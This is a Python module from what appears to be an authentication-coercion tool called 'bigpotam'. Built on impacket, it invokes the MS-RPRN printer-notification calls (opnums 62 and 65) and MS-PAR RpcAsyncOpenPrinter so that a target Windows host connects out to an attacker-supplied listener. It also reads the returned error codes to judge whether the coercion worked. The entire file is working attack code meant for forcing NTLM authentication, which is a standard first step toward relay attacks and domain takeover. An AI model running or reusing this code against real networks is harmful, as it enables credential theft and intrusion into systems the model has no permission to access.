"""MS-RPRN and MS-PAR trigger functions."""

import logging

from impacket.dcerpc.v5 import rprn
from impacket.dcerpc.v5.dtypes import NULL

from bigpotam.methods import UNCONFIRMED, check_error
from bigpotam.paths import rprn_path
from bigpotam.structures import RpcRemoteFindFirstPrinterChangeNotification

log = logging.getLogger("bigpotam")

# Result codes of the notification call itself, after RpcOpenPrinter worked.
# rpc_s_access_denied=0x05, ERROR_BAD_NETPATH=0x35
_SUCCESS_CODES = {0x00000005, 0x00000035}
_SUCCESS_STRINGS = ("rpc_s_access_denied", "ERROR_BAD_NETPATH")

# A patched Win11 24H2 host (October 2026 update, spoolss pipe absent)
# returned RPC_S_SERVER_UNAVAILABLE over the EPM/TCP path without connecting
# out, so it no longer proves a callback.
_UNCONFIRMED_CODES = {0x000006BA}
_UNCONFIRMED_STRINGS = ("RPC_S_SERVER_UNAVAILABLE",)


def _check_result(name, e):
    if check_error(e, _SUCCESS_CODES, _SUCCESS_STRINGS):
        return True
    if check_error(e, _UNCONFIRMED_CODES, _UNCONFIRMED_STRINGS):
        log.warning(
            "  %s: call returned RPC_S_SERVER_UNAVAILABLE, callback unconfirmed: "
            "patched hosts return this without connecting",
            name,
        )
        return UNCONFIRMED
    log.debug("%s: %s", name, e)
    return False


def _open_printer(dce, target, name):
    """Get a printer handle, or None if RpcOpenPrinter fails.

    A failed RpcOpenPrinter (e.g. rpc_s_access_denied on an unauthenticated
    bind) means the notification call never ran, so it is not a success.
    """
    try:
        return rprn.hRpcOpenPrinter(dce, f"\\\\{target}\x00")["pHandle"]
    except Exception as e:
        log.debug("%s: RpcOpenPrinter failed: %s", name, e)
        return None


def trigger_rprn_notification(dce, listener, listener_port=445, target=None, **kw):
    """RpcRemoteFindFirstPrinterChangeNotification (opnum 62)."""
    handle = _open_printer(dce, target, "RpcRemoteFindFirstPrinterChangeNotification")
    if handle is None:
        return False
    try:
        request = RpcRemoteFindFirstPrinterChangeNotification()
        request["hPrinter"] = handle
        request["fdwFlags"] = rprn.PRINTER_CHANGE_ADD_JOB
        request["fdwOptions"] = 0x00000000
        request["pszLocalMachine"] = rprn_path(listener, listener_port)
        request["dwPrinterLocal"] = 0
        request["cbBuffer"] = NULL
        request["pBuffer"] = NULL
        dce.request(request)
        return True
    except Exception as e:
        return _check_result("RpcRemoteFindFirstPrinterChangeNotification", e)


def trigger_rprn_notification_ex(dce, listener, listener_port=445, target=None, **kw):
    """RpcRemoteFindFirstPrinterChangeNotificationEx (opnum 65)."""
    handle = _open_printer(dce, target, "RpcRemoteFindFirstPrinterChangeNotificationEx")
    if handle is None:
        return False
    try:
        request = rprn.RpcRemoteFindFirstPrinterChangeNotificationEx()
        request["hPrinter"] = handle
        request["fdwFlags"] = rprn.PRINTER_CHANGE_ADD_JOB
        request["fdwOptions"] = 0x00000000
        request["pszLocalMachine"] = rprn_path(listener, listener_port)
        request["dwPrinterLocal"] = 0
        request["pOptions"] = NULL
        dce.request(request)
        return True
    except Exception as e:
        return _check_result("RpcRemoteFindFirstPrinterChangeNotificationEx", e)


def trigger_par_async_open_printer(dce, listener, listener_port=445, **kw):
    """MS-PAR RpcAsyncOpenPrinter (opnum 0)."""
    try:
        from impacket.dcerpc.v5 import par

        request = par.RpcAsyncOpenPrinter()
        request["pPrinterName"] = rprn_path(listener, listener_port)
        request["pDatatype"] = NULL
        request["pDevModeContainer"] = par.DEVMODE_CONTAINER()
        request["AccessRequired"] = 0
        request["pClientInfo"] = par.SPLCLIENT_CONTAINER()
        request["pClientInfo"]["Level"] = 1
        request["pClientInfo"]["ClientInfo"]["tag"] = 1
        client_info = par.SPLCLIENT_INFO_1()
        client_info["dwSize"] = 0
        client_info["pMachineName"] = NULL
        client_info["pUserName"] = NULL
        client_info["dwBuildNum"] = 0
        client_info["dwMajorVersion"] = 0
        client_info["dwMinorVersion"] = 0
        client_info["wProcessorArchitecture"] = 0
        request["pClientInfo"]["ClientInfo"]["pClientInfo1"] = client_info
        dce.request(request)
        return True
    except Exception as e:
        return _check_result("RpcAsyncOpenPrinter", e)
